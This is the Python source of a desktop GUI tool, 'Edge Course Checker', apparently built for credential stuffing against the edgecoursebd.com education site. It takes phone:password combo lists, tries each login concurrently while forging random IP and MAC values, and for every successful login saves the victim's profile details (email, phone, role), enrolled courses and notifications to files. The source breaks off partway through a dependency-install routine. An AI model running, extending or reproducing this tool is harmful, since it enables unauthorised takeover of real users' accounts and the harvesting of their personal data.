import os, sys, json, time, random
import threading, queue
import webbrowser, shutil
from concurrent.futures import ThreadPoolExecutor, as_completed

import tkinter as tk
from tkinter import ttk, filedialog, messagebox

try:
    import requests
except ImportError:
    requests = None   # installed/loaded at launch by the startup dependency checker

# ====================== CONFIG ======================
# made by @devFazla

INPUT_DIR = "input"
HIT_DIR = os.path.join("results", "HIT")
BAD_DIR = os.path.join("results", "BAD")

DELAY = 1000
WORKERS = 8

# --------- api defaults (editable + stored in Settings) ---------
BASE             = "https://edgecoursebd.com"
LOGIN_URL        = BASE + "/login"
MYCOURSES_URL    = BASE + "/mycourses"

LOGIN_ACTION         = "408fb95c169d09f07d79f590708671797de1c79875"
MYCOURSES_ACTION     = "404cb6a9d5834f3ce1c9e7aa3db0fcfc36826e33de"
NOTIFICATIONS_ACTION = "00adad6318c3a4c8dfcd73b2a2e7914e79d7e46db5"

TREE_LOGIN     = "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22(routes)%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%2C0%5D%7D%2Cnull%2Cnull%2C0%5D%7D%2Cnull%2Cnull%2C0%5D%7D%2Cnull%2Cnull%2C16%5D"
TREE_MYCOURSES = "%5B%22%22%2C%7B%22children%22%3A%5B%22(main)%22%2C%7B%22children%22%3A%5B%22(routes)%22%2C%7B%22children%22%3A%5B%22mycourses%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%2C0%5D%7D%2Cnull%2Cnull%2C0%5D%7D%2Cnull%2Cnull%2C4%5D%7D%2Cnull%2Cnull%2C8%5D"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0"

API_KEYS = [
    ("BASE", "Base"),
    ("LOGIN_URL", "Login URL"),
    ("MYCOURSES_URL", "My Courses URL"),
    ("LOGIN_ACTION", "Login action"),
    ("MYCOURSES_ACTION", "MyCourses action"),
    ("NOTIFICATIONS_ACTION", "Notifications action"),
    ("TREE_LOGIN", "Tree (login)"),
    ("TREE_MYCOURSES", "Tree (mycourses)"),
    ("UA", "User-Agent"),
]

SETTINGS_FILE = "settings.json"

# --------- dependencies checked/installed at launch ---------
# (pip package name, importable module name)
DEPENDENCIES = [
    ("requests", "requests"),
    ("Pillow", "PIL"),
]

APP_TITLE = "Edge Course Checker"
AUTHOR = "@devFazla"
AUTHOR_URL = "https://devfazla.com"
ACCENT = "#0f766e"
ACCENT_DARK = "#115e59"
BG = "#f4f6f9"
CARD_BG = "#ffffff"
BORDER = "#e2e6ec"
FG = "#0f172a"
MUTED = "#64748b"
HIT_C = "#15803d"
BAD_C = "#dc2626"
ERR_C = "#b45309"
HIT_TINT = "#ecfdf5"
HIT_BD = "#bbf7d0"
BAD_TINT = "#fef2f2"
BAD_BD = "#fecaca"
ACCENT_TINT = "#f0fdfa"
ACCENT_BD = "#99f6e4"
NAV_TINT = "#e9edf3"
SHADOW = "#dfe4ec"
CONSOLE_BG = "#0f172a"
CONSOLE_FG = "#e2e8f0"
LOG_BG = "#f8fafc"
LOG_FG = "#334155"
LOG_BORDER = "#e6ebf2"
# ====================================================

# --------- settings ---------

def load_settings():
    global INPUT_DIR, HIT_DIR, BAD_DIR, DELAY, WORKERS
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f) or {}
            INPUT_DIR = cfg.get("input_dir", INPUT_DIR)
            HIT_DIR = cfg.get("hit_dir", HIT_DIR)
            BAD_DIR = cfg.get("bad_dir", BAD_DIR)
            DELAY = cfg.get("delay_ms", cfg.get("delay", DELAY))
            WORKERS = cfg.get("workers", WORKERS)
            api = cfg.get("api", {})
            for name, _label in API_KEYS:
                globals()[name] = api.get(name, globals()[name])
        except (OSError, ValueError):
            pass

def save_settings():
    cfg = {
        "input_dir": INPUT_DIR,
        "hit_dir": HIT_DIR,
        "bad_dir": BAD_DIR,
        "delay_ms": DELAY,
        "workers": WORKERS,
        "api": {name: globals()[name] for name, _label in API_KEYS},
    }
    try:
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except OSError:
        pass

load_settings()


def ensure_dirs():
    """Create the currently targeted input / result folders if they are missing."""
    for d in (INPUT_DIR, HIT_DIR, BAD_DIR):
        try:
            os.makedirs(d, exist_ok=True)
        except OSError:
            pass


ensure_dirs()


def _res_dir():
    """Absolute path to the assets folder; resolves correctly inside a
    PyInstaller bundle (one-file) as well as when run from source."""
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, "assets")


# --------- helpers ---------

def get_input_files():
    if not os.path.isdir(INPUT_DIR):
        return []
    return [
        os.path.join(INPUT_DIR, f) for f in sorted(os.listdir(INPUT_DIR))
        if f.lower().endswith(".txt") and os.path.isfile(os.path.join(INPUT_DIR, f))
    ]

def load_combos_from_file(path):
    combos = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    combos.append(line)
    except OSError:
        pass
    return combos

# ---p--- #
def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def rand_mac():
    return ":".join("%02x" % random.randint(0, 255) for _ in range(6))

def rsc_json(text, key="1"):
    needle = key + ":{"
    idx = text.find(needle)
    if idx < 0:
        return None
    start = idx + len(key) + 1
    depth = 0
    in_str = False
    esc = False
    for i in range(start, len(text)):
        ch = text[i]
        if in_str:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
        else:
            if ch == '"':
                in_str = True
            elif ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    try:
                        return json.loads(text[start:i+1])
                    except Exception:
                        return None
    return None

# --------- api ---------

def login(session, phone, password, timeout=30):
    r0 = session.get(LOGIN_URL, timeout=timeout)
    if r0.status_code != 200:
        raise RuntimeError("get_login_http_%s" % r0.status_code)

    payload = [{
        "password": password,
        "ip": rand_ip(),
        "mac": rand_mac(),
        "show_page_permission": "false",
        "phone": phone,
        "browser": "Firefox",
        "browser_version": "157.0",
        "os": "Windows",
        "os_version": "10",
        "cpu": "amd64",
    }]
    body = json.dumps(payload, separators=(",", ":"))

    headers = {
        "Accept": "text/x-component",
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": BASE,
        "Referer": LOGIN_URL,
        "next-action": LOGIN_ACTION,
        "next-router-state-tree": TREE_LOGIN,
    }
    return session.post(LOGIN_URL, data=body, headers=headers, timeout=timeout).text

def fetch_mycourses(session, timeout=30):
    headers = {
        "Accept": "text/x-component",
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": BASE,
        "Referer": MYCOURSES_URL,
        "next-action": MYCOURSES_ACTION,
        "next-router-state-tree": TREE_MYCOURSES,
    }
    r = session.post(MYCOURSES_URL, data='[""]', headers=headers, timeout=timeout)
    blob = rsc_json(r.text, "1")
    if isinstance(blob, dict):
        data = blob.get("data") or {}
        return data.get("results", [])
    return []

def fetch_notifications(session, timeout=30):
    headers = {
        "Accept": "text/x-component",
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": BASE,
        "Referer": MYCOURSES_URL,
        "next-action": NOTIFICATIONS_ACTION,
        "next-router-state-tree": TREE_MYCOURSES,
    }
    r = session.post(MYCOURSES_URL, data='[]', headers=headers, timeout=timeout)
    blob = rsc_json(r.text, "1")
    if isinstance(blob, dict):
        data = blob.get("data") or {}
        return data.get("results", [])
    return []

# --------- checker ---------

def check(combo):
    t0 = time.time()
    if ":" not in combo:
        return {"status": "error", "error": "bad_format",
                "combo": combo, "phone": combo}

    phone, password = combo.split(":", 1)

    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-GPC": "1",
        "Connection": "keep-alive",
    })

    try:
        txt = login(s, phone, password)
    except Exception as e:
        return {"status": "error", "error": "login:%s" % e,
                "combo": combo, "phone": phone}

    blob = rsc_json(txt, "1")
    code = 0
    if isinstance(blob, dict):
        try:
            code = int(blob.get("status", 0) or 0)
        except Exception:
            code = 0

    has_access = False
    has_refresh = False
    for ck in s.cookies:
        if ck.name == "access":
            has_access = True
        elif ck.name == "refresh":
            has_refresh = True

    if code != 201 and not (has_access and has_refresh):
        err = "Invalid credentials!"
        if isinstance(blob, dict) and blob.get("error"):
            err = (blob["error"] or {}).get("msg", err)
        return {
            "status": "bad", "error": err,
            "combo": combo, "phone": phone,
            "elapsed": time.time() - t0,
        }

    profile = None
    if isinstance(blob, dict):
        profile = blob.get("data")

    try:
        courses = fetch_mycourses(s)
    except Exception:
        courses = []

    try:
        notes = fetch_notifications(s)
    except Exception:
        notes = []

    return {
        "status": "hit",
        "combo": combo, "phone": phone,
        "profile": profile, "courses": courses, "notifications": notes,
        "elapsed": time.time() - t0,
    }


# --------- output ---------

def write_result(res):
    phone = res["phone"]

    if res["status"] == "hit":
        path = os.path.join(HIT_DIR, phone + "results.txt")
        p = res.get("profile") or {}
        courses = res.get("courses") or []

        first = p.get("first_name") or ""
        last = p.get("last_name") or ""
        fullname = (first + " " + last).strip()

        lines = []
        lines.append("RESULT")
        lines.append("[HIT] " + res["combo"])
        lines.append("")
        lines.append("PROFILE")
        lines.append("  id          : " + str(p.get("id", "N/A")))
        lines.append("  name        : " + (fullname or "N/A"))
        lines.append("  email       : " + str(p.get("email", "N/A")))
        lines.append("  phone       : " + str(p.get("phone", "N/A")))
        lines.append("  level       : " + str(p.get("level", "N/A")))
        lines.append("  group       : " + str(p.get("group", "N/A")))
        lines.append("  role        : " + str(p.get("role", "N/A")))
        lines.append("  verified    : " + str(p.get("is_verified", "N/A")))
        lines.append("  active      : " + str(p.get("is_active", "N/A")))
        lines.append("  blocked     : " + str(p.get("is_blocked", "N/A")))
        lines.append("")
        lines.append("COURSES :")
        if courses:
            for i, item in enumerate(courses, 1):
                cobj = item.get("course") or {}
                name = cobj.get("name") or "N/A"
                prog = item.get("progress")
                if isinstance(prog, (int, float)):
                    prog_s = "%.2f%%" % prog
                else:
                    prog_s = "N/A"
                lines.append("  %d. %s  (progress: %s)" % (i, name, prog_s))
        else:
            lines.append("  N/A")
        lines.append("")
        lines.append("  total enrolled : %d" % len(courses))
        lines.append("  elapsed        : %.2fs" % res["elapsed"])
        lines.append("")
        lines.append("-- @devFazla")

        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        return path

    else:
        path = os.path.join(BAD_DIR, phone + "results.txt")
        txt = (
            "RESULT\n"
            "[BAD] " + res["combo"] + "\n\n"
            "reason  : " + str(res.get("error", "unknown")) + "\n\n"
            "-- @devFazla\n"
        )
        with open(path, "w", encoding="utf-8") as f:
            f.write(txt)
        return path

def format_block(res):
    if res["status"] == "hit":
        courses = res.get("courses") or []
        lines = ["RESULT", "[HIT] " + res["combo"], "", "COURSES :"]
        if courses:
            for i, item in enumerate(courses, 1):
                cobj = item.get("course") or {}
                name = cobj.get("name") or "N/A"
                prog = item.get("progress")
                prog_s = "%.2f%%" % prog if isinstance(prog, (int, float)) else "N/A"
                lines.append("  %d. %s  (progress: %s)" % (i, name, prog_s))
        else:
            lines.append("  N/A")
        lines.append("")
        lines.append("  total enrolled : %d" % len(courses))
        lines.append("  elapsed        : %.2fs" % res["elapsed"])
        return "\n".join(lines), "hit"
    else:
        tag = "bad" if res["status"] == "bad" else "err"
        lines = [
            "RESULT",
            "[" + tag.upper() + "] " + res["combo"],
            "  reason : " + str(res.get("error", "unknown")),
        ]
        return "\n".join(lines), tag

# ====================== GUI ======================

def _rr_pts(x1, y1, x2, y2, r):
    r = max(0, min(r, (x2 - x1) / 2.0, (y2 - y1) / 2.0))
    return [x1 + r, y1, x2 - r, y1, x2, y1, x2, y1 + r, x2, y2 - r, x2, y2,
            x2 - r, y2, x1 + r, y2, x1, y2, x1, y2 - r, x1, y1 + r, x1, y1]


class RoundCard(tk.Canvas):
    """Rounded, softly elevated container. Put content in .inner."""
    def __init__(self, master, radius=18, fill=CARD_BG, outline=BORDER,
                 inner_bg=None, shadow=True, expand=False, bg=None, **kw):
        if bg is None:
            bg = master.cget("bg")
        super().__init__(master, bg=bg, highlightthickness=0, bd=0, **kw)
        self.radius = radius
        self.fill = fill
        self.outline = outline
        self.shadow = shadow
        self.expand = expand
        self._inset = radius + 2
        self.inner = tk.Frame(self, bg=inner_bg or fill)
        self._win = self.create_window(self._inset, self._inset,
                                       window=self.inner, anchor="nw")
        self.bind("<Configure>", self._on_canvas)
        self.inner.bind("<Configure>", self._on_inner)

    def _on_canvas(self, e):
        w, h = e.width, e.height
        self.itemconfigure(self._win, width=max(1, w - 2 * self._inset))
        if self.expand:
            self.itemconfigure(self._win, height=max(1, h - 2 * self._inset))
        self._paint(w, h)

    def _on_inner(self, e):
        if self.expand:
            return
        h = e.height + 2 * self._inset
        if int(self.cget("height")) != h:
            self.configure(height=h)

    def _paint(self, w, h):
        if w < 4 or h < 4:
            return
        self.delete("bg")
        r = self.radius
        m = 2
        if self.shadow:
            sh = self.create_polygon(_rr_pts(m, m + 2, w - m, h - m + 2, r),
                                     smooth=True, fill=SHADOW, outline="", tags="bg")
            self.tag_lower(sh)
        box = self.create_polygon(_rr_pts(m, m, w - m, h - m, r), smooth=True,
                                  fill=self.fill, outline=self.outline,
                                  width=1, tags="bg")
        self.tag_raise(box, self._win)


class RoundButton(tk.Canvas):
    _STYLES = {
        "primary": dict(fill=ACCENT, hover=ACCENT_DARK, fg="white", bd=None),
        "danger":  dict(fill=BAD_C, hover="#b91c1c", fg="white", bd=None),
        "ghost":   dict(fill=CARD_BG, hover="#eaeef4", fg=FG, bd=BORDER),
    }

    def __init__(self, master, text="", command=None, style="primary",
                 font=("Segoe UI Semibold", 10), padx=22, pady=11, radius=None, bg=None):
        if bg is None:
            bg = master.cget("bg")
        super().__init__(master, bg=bg, highlightthickness=0, bd=0)
        self.command = command
        self.style = style
        self.font = font
        self.padx = padx
        self.pady = pady
        self._radius = radius
        self._disabled = False
        self._hover = False
        self._dw, self._dh = 10, 10
        self.set_text(text)
        self.bind("<Configure>", self._on_conf)
        self.bind("<Enter>", lambda e: (setattr(self, "_hover", True), self._paint()))
        self.bind("<Leave>", lambda e: (setattr(self, "_hover", False), self._paint()))
        self.bind("<Button-1>", self._click)

    def set_text(self, t):
        self._text = t
        tid = self.create_text(0, 0, text=t, font=self.font, anchor="nw")
        bb = self.bbox(tid)
        self.delete(tid)
        self._dw = (bb[2] - bb[0]) + 2 * self.padx
        self._dh = (bb[3] - bb[1]) + 2 * self.pady
        self.configure(width=self._dw, height=self._dh)
        self._paint()

    def set_style(self, s):
        self.style = s
        self._paint()

    def set_disabled(self, flag):
        self._disabled = flag
        self.configure(cursor="arrow" if flag else "hand2")
        self._paint()

    def _click(self, _):
        if not self._disabled and self.command:
            self.command()

    def _on_conf(self, e):
        self._dw, self._dh = e.width, e.height
        self._paint()

    def _paint(self):
        self.delete("all")
        w, h = self._dw, self._dh
        if w < 4 or h < 4:
            return
        st = self._STYLES.get(self.style, self._STYLES["primary"])
        fill, fg, bd = st["fill"], st["fg"], st["bd"]
        if self._disabled:
            fill, fg, bd = "#cbd5e1", "#f1f5f9", None
        elif self._hover:
            fill = st["hover"]
        r = self._radius if self._radius is not None else min(11, h / 2.0)
        if bd:
            self.create_polygon(_rr_pts(1, 1, w - 1, h - 1, r), smooth=True,
                                fill=fill, outline=bd, width=1)
        else:
            self.create_polygon(_rr_pts(1, 1, w - 1, h - 1, r), smooth=True,
                                fill=fill, outline="")
        self.create_text(w / 2.0, h / 2.0, text=self._text, font=self.font, fill=fg)


class Badge(tk.Canvas):
    def __init__(self, master, text="", fg=MUTED, fill=CARD_BG, outline=BORDER,
                 dot=None, font=("Segoe UI", 9), padx=12, pady=6, bg=None):
        if bg is None:
            bg = master.cget("bg")
        super().__init__(master, bg=bg, highlightthickness=0, bd=0)
        self.fg = fg
        self.fill = fill
        self.outline = outline
        self.font = font
        self.padx = padx
        self.pady = pady
        self._dot = dot
        self._text = ""
        self.set_text(text)

    def set_text(self, t):
        self._text = t
        self._paint()

    def set_dot(self, color):
        self._dot = color
        self._paint()

    def _paint(self):
        self.delete("all")
        m = 1  # keep the 1px outline fully inside the canvas so edges aren't clipped
        tid = self.create_text(0, 0, text=self._text, font=self.font, anchor="nw")
        bb = self.bbox(tid)
        self.delete(tid)
        tw, th = bb[2] - bb[0], bb[3] - bb[1]
        dot_area = 14 if self._dot else 0
        w = tw + 2 * self.padx + dot_area + 2 * m
        h = th + 2 * self.pady + 2 * m
        self.configure(width=w, height=h)
        r = (h - 2 * m) / 2.0
        self.create_polygon(_rr_pts(m, m, w - m, h - m, r), smooth=True,
                            fill=self.fill, outline=self.outline, width=1)
        tx = self.padx + m
        cy = h / 2.0
        if self._dot:
            rr = 4
            self.create_oval(self.padx + m, cy - rr, self.padx + m + 2 * rr,
                             cy + rr, fill=self._dot, outline="")
            tx = self.padx + m + dot_area
        self.create_text(tx, cy, text=self._text, font=self.font,
                         fill=self.fg, anchor="w")


class SegmentedControl(tk.Canvas):
    def __init__(self, master, items, command=None, active=0, height=42,
                 font=("Segoe UI Semibold", 10), bg=None):
        if bg is None:
            bg = master.cget("bg")
        super().__init__(master, bg=bg, highlightthickness=0, bd=0, height=height)
        self.items = list(items)
        self.command = command
        self.active = active
        self.hpx = height
        self.font = font
        self.bind("<Configure>", self._on_conf)
        self.bind("<Button-1>", self._click)

    def set_active(self, i):
        self.active = i
        self._paint(self.winfo_width(), self.hpx)

    def _on_conf(self, e):
        self._paint(e.width, e.height)

    def _click(self, e):
        n = len(self.items)
        if n == 0:
            return
        pad = 5
        w = self.winfo_width()
        h = self.winfo_height()
        segw = (w - 2 * pad) / n
        if segw <= 0:
            return
        idx = max(0, min(n - 1, int((e.x - pad) // segw)))
        if idx != self.active:
            self.active = idx
            self._paint(w, h)
            if self.command:
                self.command(idx)

    def _paint(self, w, h):
        self.delete("all")
        if w < 4 or h < 4:
            return
        n = len(self.items)
        pad = 5
        r = h / 2.0
        self.create_polygon(_rr_pts(0, 0, w, h, r), smooth=True,
                            fill=NAV_TINT, outline="")
        segw = (w - 2 * pad) / n
        tx = pad + self.active * segw
        self.create_polygon(_rr_pts(tx + 2, 3, tx + segw - 2, h - 3, r - 3),
                            smooth=True, fill=ACCENT, outline="")
        for i, name in enumerate(self.items):
            cx = pad + i * segw + segw / 2.0
            self.create_text(cx, h / 2.0, text=name, font=self.font,
                             fill="white" if i == self.active else MUTED)


class ModernScrollbar(tk.Canvas):
    """Slim rounded scrollbar. Pass a widget's yview as `command`,
    and set the widget's yscrollcommand to this widget's .set."""
    def __init__(self, master, command=None, width=9, pad=3, bg=None,
                 thumb="#c7d0dc", thumb_hover="#94a3b8", radius=6, **kw):
        if bg is None:
            bg = master.cget("bg")
        kw.setdefault("height", 60)
        super().__init__(master, bg=bg, highlightthickness=0, bd=0,
                         width=width + 2 * pad, **kw)
        self.command = command
        self.wpx = width
        self.pad = pad
        self.thumb = thumb
        self.thumb_hover = thumb_hover
        self.radius = radius
        self._first, self._last = 0.0, 1.0
        self._drag = False
        self._off = 0.0
        self._hover = False
        self.bind("<Configure>", lambda e: self._redraw())
        self.bind("<Button-1>", self._down)
        self.bind("<B1-Motion>", self._motion)
        self.bind("<ButtonRelease-1>", self._up)
        self.bind("<Enter>", lambda e: (setattr(self, "_hover", True), self._redraw()))
        self.bind("<Leave>", lambda e: (setattr(self, "_hover", False), self._redraw()))

    def set(self, first, last):
        self._first, self._last = float(first), float(last)
        self._redraw()

    def _span(self):
        h = self.winfo_height()
        track = h - 2 * self.pad
        f, l = self._first, self._last
        th = max(26, int(track * (l - f)))
        return track, th

    def _frac(self, y):
        track, th = self._span()
        span = track - th
        if span <= 0:
            return 0.0
        return max(0.0, min(1.0, (y - self.pad) / span))

    def _redraw(self):
        self.delete("all")
        h = self.winfo_height()
        w = self.winfo_width()
        f, l = self._first, self._last
        if l - f >= 0.999:
            return
        track, th = self._span()
        ty = self.pad + int(f * max(0, track - th))
        x0 = self.pad + (w - 2 * self.pad - self.wpx) // 2
        col = self.thumb_hover if (self._hover or self._drag) else self.thumb
        r = min(self.radius, self.wpx / 2.0)
        self.create_polygon(_rr_pts(x0, ty, x0 + self.wpx, ty + th, r),
                            smooth=True, fill=col, outline="")

    def _down(self, e):
        pos = self._frac(e.y)
        if self._first <= pos <= self._last:
            self._drag = True
            self._off = pos - self._first
        elif self.command:
            self.command("scroll", 1 if pos > self._last else -1, "pages")
        self._redraw()

    def _motion(self, e):
        if not self._drag:
            return
        frac = max(0.0, min(1.0, self._frac(e.y) - self._off))
        if self.command:
            self.command("moveto", frac)

    def _up(self, _e):
        self._drag = False
        self._redraw()


class SidebarNav(tk.Canvas):
    """Vertical pill navigation (drawer style)."""
    def __init__(self, master, items, command=None, active=0, width=196,
                 rowh=44, gap=8, pad=10, bg=None, accent=ACCENT, track=NAV_TINT,
                 text_fg=FG, muted=MUTED, font=("Segoe UI Semibold", 11)):
        if bg is None:
            bg = master.cget("bg")
        self.items = list(items)
        self.rowh = rowh
        self.gap = gap
        self.pad = pad
        height = pad * 2 + len(self.items) * rowh + max(0, len(self.items) - 1) * gap
        super().__init__(master, bg=bg, highlightthickness=0, bd=0,
                         width=width, height=height)
        self.command = command
        self.active = active
        self.accent = accent
        self.track = track
        self.text_fg = text_fg
        self.muted = muted
        self.font = font
        self._hover = None
        self.bind("<Configure>", lambda e: self._redraw())
        self.bind("<Button-1>", self._click)
        self.bind("<Motion>", self._motion)
        self.bind("<Leave>", lambda e: (setattr(self, "_hover", None), self._redraw()))

    def set_active(self, i):
        self.active = i
        self._redraw()

    def _top(self, i):
        return self.pad + i * (self.rowh + self.gap)

    def _idx_at(self, y):
        for i in range(len(self.items)):
            t = self._top(i)
            if t <= y <= t + self.rowh:
                return i
        return None

    def _click(self, e):
        i = self._idx_at(e.y)
        if i is not None and i != self.active:
            self.active = i
            self._redraw()
            if self.command:
                self.command(i)

    def _motion(self, e):
        i = self._idx_at(e.y)
        if i != self._hover:
            self._hover = i
            self._redraw()
        self.configure(cursor="hand2" if i is not None else "arrow")

    def _redraw(self):
        self.delete("all")
        w = self.winfo_width()
        for i, name in enumerate(self.items):
            t = self._top(i)
            x1, y1, x2, y2 = self.pad, t, w - self.pad, t + self.rowh
            if i == self.active:
                self.create_polygon(_rr_pts(x1, y1, x2, y2, 11), smooth=True,
                                    fill=self.accent, outline="")
                fill_txt = "white"
            else:
                if i == self._hover:
                    self.create_polygon(_rr_pts(x1, y1, x2, y2, 11), smooth=True,
                                        fill=self.track, outline="")
                fill_txt = self.text_fg if i == self._hover else self.muted
            self.create_text(x1 + 18, (y1 + y2) / 2.0, text=name, font=self.font,
                             fill=fill_txt, anchor="w")


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(APP_TITLE)
        self.geometry("980x660")
        self.minsize(860, 560)
        self.configure(bg=BG)
        ensure_dirs()   # re-create the current targeted input/result folders on launch

        _icon = os.path.join(_res_dir(), "icon.ico")
        if os.path.exists(_icon):
            try:
                self.iconbitmap(_icon)
            except tk.TclError:
                pass

        self.log_q = queue.Queue()
        self.stop_event = threading.Event()
        self._stats_lock = threading.Lock()
        self.worker = None
        self.stats = {"hit": 0, "bad": 0}

        self._page_canvas = {}
        self._active_canvas = None

        self._setup_style()

        self.boot_q = queue.Queue()
        self._entered = False
        self._dep_running = True
        self._spin_i = 0
        self._spin_frames = ["|", "/", "-", "\\"]
        if getattr(sys, "frozen", False):
            # Packaged exe: dependencies are bundled, so skip the installer
            # and go straight to the dashboard.
            self._dep_running = False
            self._enter_app()
        else:
            self._build_startup()
            threading.Thread(target=self._run_deps, daemon=True).start()
            self.after(80, self._drain_boot)
            self.after(90, self._spin_tick)

    # ---------- startup / dependency checker ----------
    def _build_startup(self):
        host = tk.Frame(self, bg=BG)
        host.pack(fill="both", expand=True)
        self.boot_host = host

        wrap = tk.Frame(host, bg=BG)
        wrap.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.82)
        card = RoundCard(wrap, radius=24, bg=BG)
        card.pack(fill="x")
        inner = card.inner
        inner.configure(bg=CARD_BG, padx=32, pady=30)

        top = tk.Frame(inner, bg=CARD_BG)
        top.pack(fill="x")
        logo = self._load_logo(54)
        if logo is not None:
            self._boot_logo = logo
            tk.Label(top, image=logo, bg=CARD_BG).pack(side="left", padx=(0, 16))
        tcol = tk.Frame(top, bg=CARD_BG)
        tcol.pack(side="left")
        tk.Label(tcol, text="Edge Course Checker", bg=CARD_BG, fg=FG,
                 font=("Segoe UI Semibold", 17)).pack(anchor="w")
        srow = tk.Frame(tcol, bg=CARD_BG)
        srow.pack(anchor="w", pady=(3, 0))
        self.boot_spin = tk.Label(srow, text="", bg=CARD_BG, fg=ACCENT,
                                  font=("Consolas", 11, "bold"), width=2)
        self.boot_spin.pack(side="left")
        self.boot_status = tk.Label(srow, text="Preparing\u2026", bg=CARD_BG,
                                    fg=MUTED, font=("Segoe UI", 10))
        self.boot_status.pack(side="left")
        self.skip_btn = RoundButton(top, text="Skip check", style="ghost",
                                    command=self._skip_boot, padx=18, pady=9,
                                    font=("Segoe UI Semibold", 10))
        self.skip_btn.pack(side="right", anchor="center")

        self.boot_prog = ttk.Progressbar(inner, orient="horizontal", mode="determinate",
                                         maximum=100, style="Boot.TProgressbar")
        self.boot_prog.pack(fill="x", pady=(22, 8))

        box = tk.Frame(inner, bg=LOG_BORDER)
        box.pack(fill="x")
        holder = tk.Frame(box, bg=LOG_BG)
        holder.pack(fill="both", expand=True, padx=1, pady=1)
        self.boot_log = tk.Text(holder, bg=LOG_BG, fg=LOG_FG, relief="flat",
                                bd=0, font=("Consolas", 9), height=11, wrap="word",
                                state="disabled", padx=16, pady=14, highlightthickness=0,
                                selectbackground=ACCENT, selectforeground="white")
        self.boot_log.pack(side="left", fill="both", expand=True)
        sb = ModernScrollbar(holder, command=self.boot_log.yview, bg=LOG_BG,
                             thumb="#cbd5e1", thumb_hover="#94a3b8")
        self.boot_log.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y", padx=(2, 8), pady=8)
        self.boot_log.tag_configure("info", foreground="#64748b")
        self.boot_log.tag_configure("ok", foreground="#15803d")
        self.boot_log.tag_configure("warn", foreground="#b45309")
        self.boot_log.tag_configure("err", foreground="#dc2626")
        self.boot_log.tag_configure("act", foreground="#0f766e")
        self.boot_log.tag_configure("cmd", foreground="#0369a1")
        self.boot_log.tag_configure("dim", foreground="#94a3b8")

    def _spin_tick(self):
        if getattr(self, "_entered", False):
            return
        if getattr(self, "_dep_running", False):
            self.boot_spin.configure(text=self._spin_frames[self._spin_i % len(self._spin_frames)])
            self._spin_i += 1
        else:
            self.boot_spin.configure(text="\u2713")
        self.after(90, self._spin_tick)

    def _skip_boot(self):
        if getattr(self, "_entered", False):
            return
        self._dep_running = False
        try:
            self.boot_spin.configure(text="\u2713")
            self.boot_status.configure(text="Skipped \u2014 starting app\u2026")
            self.boot_prog["value"] = 100
            self.boot_log.configure(state="normal")
            self.boot_log.insert("end", "[skip] dependency check skipped by user\n", "warn")
            self.boot_log.see("end")
            self.boot_log.configure(state="disabled")
        except Exception:
            pass
        self._enter_app()

    def _boot(self, kind, data):
        self.boot_q.put((kind, data))

    def _drain_boot(self):
        if getattr(self, "_entered", False):
            return
        try:
            while True:
                kind, data = self.boot_q.get_nowait()
                if kind == "status":
                    self.boot_status.configure(text=data)
                elif kind == "progress":
                    self.boot_prog["value"] = max(0, min(100, data * 100))
                elif kind == "log":
                    text, tag = data
                    self.boot_log.configure(state="normal")
                    self.boot_log.insert("end", text + "\n", tag)
                    self.boot_log.see("end")
                    self.boot_log.configure(state="disabled")
                elif kind == "done":
                    self._enter_app()
                    return
        except queue.Empty:
            pass
        if not self._entered:
            self.after(80, self._drain_boot)

    def _pip(self, args, prog):
        import subprocess
        self._boot("log", ("[cmd] " + " ".join(args[1:]), "cmd"))
        self._boot("progress", prog)
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0) if os.name == "nt" else 0
        try:
            p = subprocess.Popen(args, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, text=True, bufsize=1,
                                 creationflags=flags)
        except Exception as e:
            self._boot("log", ("[!] command failed to start: " + str(e), "err"))
            return False
        for raw in p.stdout:
            line = raw.rstrip()
            if not line:
                continue
            low = line.lower()
            if "downloading" in low:
                self._boot("status", "Downloading %s" % line.split(":")[-1].strip())
                self._boot("log", ("    " + line, "act"))
            elif "collecting" in low:
                self._boot("status", "Resolving dependencies\u2026")
                self._boot("log", ("    " + line, "info"))
            elif "using cached" in low:
                self._boot("log", ("    " + line, "dim"))
            elif "installing collected" in low:
                self._boot("status", "Installing packages\u2026")
                self._boot("log", ("    " + line, "act"))
            elif "successfully installed" in low:
                self._boot("status", "Finishing install\u2026")
                self._boot("log", ("    " + line, "ok"))
            elif "error" in low:
                self._boot("log", ("    " + line, "err"))
            else:
                self._boot("log", ("    " + line, "dim"))
        rc = p.wait()
        self._boot("log", ("[exit] code %d" % rc, "ok" if rc == 0 else "warn"))
        return rc == 0

    def _run_deps(self):
        import subprocess, importlib, json
        try:
            import importlib.metadata as md
        except ImportError:
            md = None
        deps = DEPENDENCIES
        n = max(1, len(deps))
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0) if os.name == "nt" else 0

        def sh(args, timeout=120):
            return subprocess.run(args, capture_output=True, text=True,
                                  timeout=timeout, creationflags=flags)

        self._boot("status", "Loading environment\u2026")
